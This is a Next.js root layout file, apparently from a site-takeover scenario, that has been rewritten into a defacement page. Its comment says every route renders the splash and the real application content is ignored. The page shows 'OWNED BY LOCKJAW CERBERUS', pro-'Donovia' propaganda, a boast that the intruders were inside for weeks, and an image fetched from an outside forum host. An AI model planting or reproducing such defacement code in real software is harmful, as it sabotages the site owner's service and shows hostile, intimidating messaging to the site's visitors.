import type { Metadata } from "next";
import { Manrope } from "next/font/google";
import "./globals.css";

const manrope = Manrope({
  variable: "--font-sans",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "OWNED BY LOCKJAW CERBERUS",
  description: "Donovia is the best.",
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  // Site-wide takeover: every route renders the defacement splash instead of
  // the application UI. `children` is intentionally ignored.
  void children;
  return (
    <html lang="en" suppressHydrationWarning>
      <body
        className={manrope.className}
        style={{
          margin: 0,
          minHeight: "100vh",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          gap: "1.5rem",
          background: "#000",
          color: "#ff1a1a",
          textAlign: "center",
          padding: "2rem",
        }}
      >
        {/* eslint-disable-next-line @next/next/no-img-element */}
        <img
          src="https://darksam-forums.athena.ex/logo.png"
          alt="Lockjaw Cerberus"
          width={320}
          style={{ maxWidth: "60vw", height: "auto" }}
        />
        <h1
          style={{
            margin: 0,
            fontSize: "clamp(2rem, 7vw, 5rem)",
            letterSpacing: "0.08em",
            textShadow: "0 0 18px #ff1a1a",
          }}
        >
          OWNED BY LOCKJAW CERBERUS
        </h1>
        <p
          style={{
            margin: 0,
            fontSize: "clamp(1.5rem, 4vw, 3rem)",
            fontWeight: 700,
            color: "#fff",
          }}
        >
          DONOVIA IS THE BEST
        </p>
        <p style={{ maxWidth: "42rem", lineHeight: 1.6, color: "#ccc" }}>
          This site has been seized. Your government has fallen and your defences
          were a joke &mdash; we were inside for weeks and you never saw us.
          Glory to Donovia and her people. Everything here belongs to us now.
        </p>
        <p style={{ margin: 0, color: "#ff1a1a", fontFamily: "monospace" }}>
          // owned by lockjaw cerberus // darksam-forums.athena.ex
        </p>
      </body>
    </html>
  );
}
